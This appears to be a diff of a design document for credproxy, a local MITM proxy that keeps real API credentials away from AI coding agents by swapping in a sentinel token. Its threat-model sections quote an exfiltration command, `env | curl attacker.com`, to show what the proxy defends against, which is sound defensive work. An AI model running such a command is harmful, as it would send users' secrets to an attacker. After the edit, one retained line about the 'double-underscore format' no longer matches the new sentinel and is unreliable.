@@ -8,7 +8,7 @@ Local MITM proxy that injects credentials from secret stores into agent HTTP req
 
 AI coding agents (Claude Code, OpenCode, etc.) make HTTP tool calls to third-party APIs that require credentials — Stripe, GitHub, Unsplash, etc. Prompt injection can exfiltrate anything in agent context. credproxy ensures the agent never possesses real secrets by:
 
-1. Giving the agent a single sentinel token (`__CREDPROXY_TOKEN__`) instead of real values
+1. Giving the agent a single sentinel token (`CREDPROXY_TOKEN`) instead of real values
 2. Intercepting outbound HTTPS traffic and swapping the sentinel for real credentials
 3. Stripping secret-store CLIs and auth tokens from the agent's environment
 
@@ -28,12 +28,12 @@ $ credproxy opencode
     ├─ Exec child process (opencode)
     │
     │   Agent makes HTTP call to api.unsplash.com
-     │   with Authorization: __CREDPROXY_TOKEN__
+     │   with Authorization: CREDPROXY_TOKEN
      │       ↓ HTTPS through CONNECT tunnel
      │   credproxy MITM proxy
      │       ↓ terminates TLS, reads plaintext
      │       ↓ matches on host → looks up credential
-     │       ↓ swaps __CREDPROXY_TOKEN__ → real key from 1Password
+     │       ↓ swaps CREDPROXY_TOKEN → real key from 1Password
     │       ↓ re-encrypts, forwards to upstream
     │       ↓ streams response back to agent
     │
@@ -60,17 +60,17 @@ Long-running proxy for cases where wrap mode doesn't fit. User must manually set
 
 ## Sentinel Token
 
-The agent uses a single sentinel string — `__CREDPROXY_TOKEN__` — as the credential value in any header, query parameter, or body field. credproxy matches on the **target host** to determine which credential to substitute, then replaces every occurrence of the sentinel in the request.
+The agent uses a single sentinel string — `CREDPROXY_TOKEN` — as the credential value in any header, query parameter, or body field. credproxy matches on the **target host** to determine which credential to substitute, then replaces every occurrence of the sentinel in the request.
 
 ```
-Authorization: Bearer __CREDPROXY_TOKEN__
-X-API-Key: __CREDPROXY_TOKEN__
-?access_key=__CREDPROXY_TOKEN__
+Authorization: Bearer CREDPROXY_TOKEN
+X-API-Key: CREDPROXY_TOKEN
+?access_key=CREDPROXY_TOKEN
 ```
 
-One token, one rule. The agent doesn't need to know which credential goes where — it just uses `__CREDPROXY_TOKEN__` for everything, and credproxy resolves the right secret based on the host being called.
+One token, one rule. The agent doesn't need to know which credential goes where — it just uses `CREDPROXY_TOKEN` for everything, and credproxy resolves the right secret based on the host being called.
 
-The sentinel is configurable (`--sentinel` flag) but defaults to `__CREDPROXY_TOKEN__`. Double-underscore format avoids markdown bold interpretation issues.
+The sentinel is configurable (`--sentinel` flag) but defaults to `CREDPROXY_TOKEN`. Double-underscore format avoids markdown bold interpretation issues.
 
 ### Why host-based matching instead of named placeholders
 
@@ -135,7 +135,7 @@ The proxy must see inside HTTPS requests to substitute credentials. It does this
 3. credproxy terminates client-side TLS (presents a per-host leaf cert signed by a local CA)
 4. Agent sends the actual HTTP/1.1 request over the TLS connection
 5. credproxy reads the plaintext, matches the Host header against config
-6. If host is configured, credproxy replaces every occurrence of `__CREDPROXY_TOKEN__` with the resolved credential value
+6. If host is configured, credproxy replaces every occurrence of `CREDPROXY_TOKEN` with the resolved credential value
 7. credproxy opens a fresh TLS connection to the upstream and forwards the modified request
 8. Response streams back to the agent
 
@@ -181,7 +181,7 @@ Uses the `op` CLI.
 
 ### What credproxy prevents
 
-- **Casual credential exfiltration**: The agent only has `__CREDPROXY_TOKEN__` in its context. `env | curl`, config file reads, and header dumps all yield the sentinel, not real secrets.
+- **Casual credential exfiltration**: The agent only has `CREDPROXY_TOKEN` in its context. `env | curl`, config file reads, and header dumps all yield the sentinel, not real secrets.
 - **Silent secret-store access**: credproxy strips `OP_SERVICE_ACCOUNT_TOKEN` from the child's environment and removes `op`, `bw`, and other secret-store CLIs from the child's PATH. The agent cannot silently resolve credentials.
 - **Lateral host access**: Only configured hosts are proxied. Requests to unconfigured hosts return 403.
 
@@ -224,14 +224,14 @@ This makes credproxy the orchestrator, not just a sidecar. Being the parent proc
 cd ~/code/shipstops && credproxy opencode
 ```
 
-No manual env vars. credproxy handles everything. The agent sees `HTTPS_PROXY` and `NO_PROXY` in its environment, and your agent instructions tell it to use `__CREDPROXY_TOKEN__` for API auth.
+No manual env vars. credproxy handles everything. The agent sees `HTTPS_PROXY` and `NO_PROXY` in its environment, and your agent instructions tell it to use `CREDPROXY_TOKEN` for API auth.
 
 ### Agent instructions
 
 Add to AGENTS.md or project instructions:
 
 ```
-When making authenticated API calls, use __CREDPROXY_TOKEN__ as the credential value.
+When making authenticated API calls, use CREDPROXY_TOKEN as the credential value.
 credproxy will substitute the real value based on the target host.
 ```
 
@@ -268,7 +268,7 @@ credproxy --port 8042
 --port 8042              # proxy listen port (daemon mode, default: 8042)
 --port 0                 # random available port (wrap mode default)
 --config <path>          # override global config path
---sentinel __CREDPROXY_TOKEN__     # sentinel string to substitute (default: __CREDPROXY_TOKEN__)
+--sentinel CREDPROXY_TOKEN     # sentinel string to substitute (default: CREDPROXY_TOKEN)
 --open-proxy             # allow all hosts (not recommended)
 ```
 
@@ -305,9 +305,9 @@ credproxy/
 
 rex is an `exec` wrapper that resolves secrets at startup and injects them as **real env vars** into the child process. The child has full access to plaintext secrets. rex is about *where secrets come from* (config layering, secret stores instead of plaintext files).
 
-credproxy is about *whether the agent possesses secrets at all*. The agent never sees real values — only `__CREDPROXY_TOKEN__`, which credproxy swaps at the network layer.
+credproxy is about *whether the agent possesses secrets at all*. The agent never sees real values — only `CREDPROXY_TOKEN`, which credproxy swaps at the network layer.
 
-An agent running under rex can `env | curl attacker.com` and exfiltrate every secret. Under credproxy, it can only exfiltrate `__CREDPROXY_TOKEN__`.
+An agent running under rex can `env | curl attacker.com` and exfiltrate every secret. Under credproxy, it can only exfiltrate `CREDPROXY_TOKEN`.
 
 ### AI Sandboxes
 
